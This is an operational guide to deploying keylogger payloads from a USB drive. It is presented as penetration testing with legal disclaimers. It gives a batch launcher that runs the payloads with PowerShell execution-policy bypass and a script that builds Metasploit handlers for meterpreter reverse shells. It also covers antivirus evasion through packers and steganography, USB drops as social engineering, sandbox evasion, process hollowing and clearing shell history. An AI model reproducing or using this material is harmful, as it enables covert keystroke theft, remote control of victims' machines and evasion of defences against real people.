USB DEPLOYMENT GUIDE FOR KEYLOGGER PAYLOADS
===========================================

⚠️ LEGAL WARNING: Only use on systems you own or have explicit authorization to test ⚠️

This guide explains how to put the generated keylogger payloads on a USB drive for portable penetration testing.

========================================
STEP 1: PREPARE USB DRIVE
========================================

1. Insert USB drive into your Kali Linux system

2. Check available drives:
   lsblk -f
   
3. Identify your USB drive (usually /dev/sdb, /dev/sdc, etc.)
   - Look for the device that appeared after inserting USB
   
4. Create mount point and mount USB:
   sudo mkdir -p /mnt/usb
   sudo mount /dev/sdX1 /mnt/usb    # Replace X with your drive letter

5. Alternative - Use GUI file manager:
   - USB should auto-mount in /media/xx/[USB_NAME]

========================================
STEP 2: COPY PAYLOADS TO USB
========================================

Method 1 - Command Line:
------------------------
# Copy all payload files
sudo cp /home/xx/keylogger_payloads/*.exe /mnt/usb/
sudo cp /home/xx/keylogger_payloads/*.py /mnt/usb/
sudo cp /home/xx/keylogger_payloads/*.ps1 /mnt/usb/
sudo cp /home/xx/keylogger_payloads/*.rc /mnt/usb/
sudo cp /home/xx/keylogger_payloads/*.txt /mnt/usb/
sudo cp /home/xx/keylogger_payloads/*.md /mnt/usb/

# Or copy entire directory
sudo cp -r /home/xx/keylogger_payloads /mnt/usb/

Method 2 - GUI File Manager:
---------------------------
1. Open file manager
2. Navigate to /home/xx/keylogger_payloads/
3. Select all files (Ctrl+A)
4. Copy files (Ctrl+C)
5. Navigate to mounted USB drive
6. Paste files (Ctrl+V)

========================================
STEP 3: CREATE PORTABLE LAUNCHER
========================================

Create an autorun script for easy deployment:

Windows Batch File (autorun.bat):
---------------------------------
@echo off
echo Keylogger Payload Launcher
echo ==========================
echo.
echo Available Payloads:
echo 1. Windows x64 TCP (Port 4444)
echo 2. Windows HTTPS (Port 443) 
echo 3. PowerShell (Port 8080)
echo 4. Python Cross-Platform (Port 4445)
echo.
set /p choice="Select payload (1-4): "

if %choice%==1 (
    echo Launching Windows x64 TCP payload...
    start windows_keylogger_test.exe
)
if %choice%==2 (
    echo Launching Windows HTTPS payload...
    start windows_https_keylogger.exe
)
if %choice%==3 (
    echo Launching PowerShell payload...
    powershell -ExecutionPolicy Bypass -File powershell_keylogger.ps1
)
if %choice%==4 (
    echo Launching Python payload...
    python python_keylogger_test.py
)

pause

Linux Shell Script (run_payload.sh):
------------------------------------
#!/bin/bash
echo "Keylogger Payload Launcher"
echo "=========================="
echo ""
echo "Available Payloads:"
echo "1. Python Cross-Platform (Port 4445)"
echo "2. Copy Windows payloads to target"
echo ""
read -p "Select option (1-2): " choice

case $choice in
    1)
        echo "Launching Python payload..."
        python3 python_keylogger_test.py
        ;;
    2)
        echo "Copying Windows payloads to /tmp/"
        cp *.exe /tmp/
        cp *.ps1 /tmp/
        echo "Payloads copied to /tmp/"
        ;;
    *)
        echo "Invalid selection"
        ;;
esac

========================================
STEP 4: USB FILE STRUCTURE
========================================

Recommended USB directory structure:

USB_ROOT/
├── payloads/
│   ├── windows_keylogger_test.exe
│   ├── windows_https_keylogger.exe
│   ├── powershell_keylogger.ps1
│   └── python_keylogger_test.py
├── handlers/
│   ├── handler_setup.rc
│   └── setup_handlers.sh
├── documentation/
│   ├── README.md
│   ├── keylogger_commands.txt
│   └── USB_DEPLOYMENT_GUIDE.txt
├── tools/
│   └── (additional penetration testing tools)
└── autorun.bat (Windows launcher)

========================================
STEP 5: HANDLER SETUP ON USB
========================================

Create portable handler setup script:

setup_handlers.sh:
------------------
#!/bin/bash
echo "Starting Metasploit handlers for USB payloads..."
echo "==============================================="

# Check if Metasploit is installed
if ! command -v msfconsole &> /dev/null; then
    echo "Metasploit not found! Please install Metasploit Framework."
    exit 1
fi

# Get local IP address
LOCAL_IP=$(hostname -I | awk '{print $1}')
echo "Detected local IP: $LOCAL_IP"
read -p "Use this IP or enter different IP: " USER_IP

if [ ! -z "$USER_IP" ]; then
    LOCAL_IP=$USER_IP
fi

echo "Setting up handlers with IP: $LOCAL_IP"

# Create dynamic handler script
cat > temp_handlers.rc << EOF
# Auto-generated handler script
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LOCAL_IP
set LPORT 4444
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST $LOCAL_IP
set LPORT 4445
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST $LOCAL_IP
set LPORT 443
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 8080
set ExitOnSession false
exploit -j

sessions -l
EOF

# Launch Metasploit with handlers
msfconsole -r temp_handlers.rc

========================================
STEP 6: SECURITY CONSIDERATIONS
========================================

USB Security Best Practices:
----------------------------
1. **Encryption**: Consider encrypting the USB drive
   - Use LUKS encryption on Linux
   - Use BitLocker on Windows
   - Use VeraCrypt for cross-platform

2. **File Permissions**: Set appropriate permissions
   chmod 700 *.exe *.ps1 *.py
   
3. **Anti-Virus Evasion**: 
   - Store in password-protected archives
   - Use custom packers/encoders
   - Keep updated with latest evasion techniques

4. **Steganography**: Hide payloads in legitimate files
   - Hide in image files using steghide
   - Embed in documents
   - Use alternate data streams (Windows)

========================================
STEP 7: DEPLOYMENT SCENARIOS
========================================

Physical Access Scenarios:
--------------------------
1. **Plug-and-Play**: Quick execution during brief physical access
2. **Social Engineering**: USB drops in target locations
3. **Maintenance Access**: During authorized maintenance windows
4. **Red Team Exercises**: Simulated attacks with permission

Execution Methods:
-----------------
1. **AutoRun**: Windows autorun.inf (if enabled)
2. **Manual Execution**: User runs payload manually
3. **LNK Files**: Shortcut files that execute payload
4. **Rubber Ducky**: USB devices that type commands

========================================
STEP 8: CLEANUP AND EVIDENCE
========================================

Post-Test Cleanup:
-----------------
1. Remove payload files from target systems
2. Clear any persistence mechanisms
3. Remove registry entries (Windows)
4. Clear bash history (Linux)
5. Document all activities performed

Evidence Collection:
-------------------
1. Screenshots of successful connections
2. Keystroke logs captured
3. System information gathered
4. Network traffic analysis
5. Detailed testing timeline

========================================
STEP 9: LEGAL AND ETHICAL REMINDERS
========================================

Before Using USB Payloads:
--------------------------
✓ Obtain written authorization
✓ Define scope of testing
✓ Establish rules of engagement  
✓ Plan cleanup procedures
✓ Document all activities
✓ Respect privacy boundaries
✓ Follow local laws and regulations

Never Use For:
--------------
✗ Unauthorized access to systems
✗ Personal gain or malicious intent
✗ Violating privacy rights
✗ Circumventing security without permission
✗ Any illegal activities

========================================
STEP 10: ADVANCED USB TECHNIQUES
========================================

BadUSB Techniques:
-----------------
- Program USB firmware for HID attacks
- Use Rubber Ducky for keystroke injection
- Arduino-based USB attacks
- USB Killer (hardware attacks)

Evasion Techniques:
------------------
- Multiple staged payloads
- Encrypted communications
- Domain fronting
- DNS tunneling
- Living-off-the-land binaries

Detection Avoidance:
-------------------
- Sandbox evasion
- Anti-VM techniques  
- Time-based delays
- Environmental checks
- Process hollowing

========================================
TROUBLESHOOTING
========================================

Common Issues:
--------------
1. USB not mounting: Check permissions, try different ports
2. Payloads detected: Use different encoders, update evasion
3. Network issues: Verify IP addresses, check firewall rules
4. Handler problems: Ensure correct payload matching
5. Permissions errors: Run with appropriate privileges

USB Drive Preparation:
---------------------
- Format as FAT32 for maximum compatibility
- Test on multiple operating systems
- Verify file integrity after copying
- Create backup copies of payloads
- Test autorun functionality

========================================
CONCLUSION
========================================

This USB deployment method provides a portable penetration testing platform
for authorized keylogger testing. Always follow ethical guidelines and legal
requirements when using these tools.

Remember: The goal is to improve security through authorized testing, not to
cause harm or gain unauthorized access to systems.

For questions or updates to this guide, refer to the main documentation in
README.md and keylogger_commands.txt files.